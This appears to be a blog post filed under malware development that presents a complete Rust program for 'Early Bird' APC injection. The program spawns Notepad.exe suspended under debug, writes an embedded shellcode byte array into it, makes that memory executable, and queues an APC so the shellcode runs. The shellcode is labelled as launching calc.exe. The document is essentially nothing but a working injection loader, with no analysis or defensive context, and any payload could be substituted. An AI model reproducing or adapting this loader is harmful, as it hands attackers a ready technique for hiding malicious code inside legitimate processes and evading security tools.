---
title: "EarlyBird-Injection"
date: 2026-07-20 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# EarlyBird-Injection


## main.rs

```rust
use std::{
    ffi::CString,
    io::{self, Write},
    ptr::null_mut,
};
use winapi::{
    ctypes::c_void,
    um::{
        debugapi::DebugActiveProcessStop,
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        memoryapi::{VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, WriteProcessMemory},
        processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, QueueUserAPC},
        processenv::GetEnvironmentVariableA,
        winbase::{CREATE_SUSPENDED, DEBUG_PROCESS},
        winnt::{HANDLE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PVOID},
    },
};

const TARGET_PROCESS: &str = "Notepad.exe";

// calc.exe
static PAYLOAD: [u8; 272] = [
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
];

/// Creates a suspended process under DEBUG mode (useful for later detachment)
unsafe fn create_suspended_process(
    process_name: &str,
    process_id: &mut u32,
    h_process: &mut *mut c_void,
    h_thread: &mut *mut c_void,
) -> bool {
    let mut windir = [0u8; 260]; // MAX_PATH

    // Get %WINDIR% environment variable
    if GetEnvironmentVariableA(
        b"WINDIR\0".as_ptr() as *const _,
        windir.as_mut_ptr() as *mut _,
        260,
    ) == 0
    {
        println!("[!] GetEnvironmentVariableA Failed With Error : {}", GetLastError());
        return false;
    }

    let windir_str = std::str::from_utf8(&windir[..windir.iter().position(|&x| x == 0).unwrap_or(0)]).unwrap();
    let full_path = format!("{}\\System32\\{}", windir_str, process_name);
    let path_cstr = CString::new(full_path).unwrap();

    println!("[+] Running : \"{}\" ... ", path_cstr.to_str().unwrap());

    let mut si: STARTUPINFOA = std::mem::zeroed();
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    // CreateProcessA on a single line as requested
    if CreateProcessA(null_mut(), path_cstr.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED | DEBUG_PROCESS, null_mut(), null_mut(), &mut si, &mut pi) == 0 {
        println!("[!] CreateProcessA Failed with Error : {}", GetLastError());
        return false;
    }

    println!("[+] Process created successfully");

    *process_id = pi.dwProcessId;
    *h_process = pi.hProcess;
    *h_thread = pi.hThread;

    !(*process_id == 0 || (*h_process).is_null() || (*h_thread).is_null())
}

/// Injects shellcode into a remote process (VirtualAllocEx + WriteProcessMemory)
pub unsafe fn inject_shellcode_to_remote_process(
    h_process: HANDLE,
    shellcode: &[u8],
    address: &mut PVOID,           // Output parameter: returns allocated address
) -> bool {
    if shellcode.is_empty() {
        eprintln!("\n\t[!] Shellcode is empty");
        return false;
    }

    let size_of_shellcode = shellcode.len();

    // 1. Allocate memory in the remote process (RW)
    let alloc_addr = VirtualAllocEx(
        h_process,
        null_mut(),
        size_of_shellcode,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if alloc_addr.is_null() {
        eprintln!("[!] VirtualAllocEx Failed With Error: {}", GetLastError());
        return false;
    }

    *address = alloc_addr;
    println!("[+] Allocated Memory At : {:p}", alloc_addr);

    println!("[+] Press <Enter> to Write Payload ... ");
    let _ = io::stdout().flush();
    let _ = io::stdin().read_line(&mut String::new());

    // 2. Write the shellcode into the remote process
    let mut bytes_written: usize = 0;
    if WriteProcessMemory(
        h_process,
        alloc_addr,
        shellcode.as_ptr() as *const c_void,
        size_of_shellcode,
        &mut bytes_written,
    ) == 0
        || bytes_written != size_of_shellcode
    {
        eprintln!("[!] WriteProcessMemory Failed With Error: {}", GetLastError());
        VirtualFreeEx(h_process, alloc_addr, 0, MEM_RELEASE);
        return false;
    }

    println!("[+] Successfully Written {} Bytes", bytes_written);

    // 3. Change memory protection to executable
    let mut old_protection: u32 = 0;
    if VirtualProtectEx(
        h_process,
        alloc_addr,
        size_of_shellcode,
        PAGE_EXECUTE_READWRITE,
        &mut old_protection,
    ) == 0
    {
        eprintln!("[!] VirtualProtectEx Failed With Error: {}", GetLastError());
        VirtualFreeEx(h_process, alloc_addr, 0, MEM_RELEASE);
        return false;
    }

    println!("[+] Memory protection changed successfully");
    true
}

fn main() {
    unsafe {
        let mut h_process: *mut c_void = null_mut();
        let mut h_thread: *mut c_void = null_mut();
        let mut process_id: u32 = 0;
        let mut address: PVOID = null_mut();

        println!("[+] Creating \"{}\" Process As A Debugged Process ... ", TARGET_PROCESS);

        if !create_suspended_process(
            TARGET_PROCESS,
            &mut process_id,
            &mut h_process,
            &mut h_thread,
        ) {
            return;
        }

        println!("\t[i] Target Process Created With Pid : {}", process_id);
        println!("[+] DONE \n");

        println!("[+] Writing Shellcode To The Target Process ... ");

        if !inject_shellcode_to_remote_process(h_process, &PAYLOAD, &mut address) {
            CloseHandle(h_process);
            CloseHandle(h_thread);
            return;
        }

        println!("[+] DONE \n");

        // Execute shellcode via APC (Asynchronous Procedure Call)
        if QueueUserAPC(Some(std::mem::transmute(address)), h_thread, 0) == 0 {
            println!("[!] QueueUserAPC Failed With Error: {}", GetLastError());
        } else {
            println!("[i] APC Queued Successfully");
        }

        println!("[#] Press <Enter> To Run Shellcode ... ");
        let _ = io::stdout().flush();
        let _ = io::stdin().read_line(&mut String::new());

        println!("[i] Detaching The Target Process ... ");
        if DebugActiveProcessStop(process_id) == 0 {
            println!("[!] DebugActiveProcessStop Failed With Error: {}", GetLastError());
        } else {
            println!("[+] DONE \n");
        }

        println!("[#] Press <Enter> To Quit ... ");
        let _ = io::stdout().flush();
        let _ = io::stdin().read_line(&mut String::new());

        CloseHandle(h_process);
        CloseHandle(h_thread);
    }
}
```

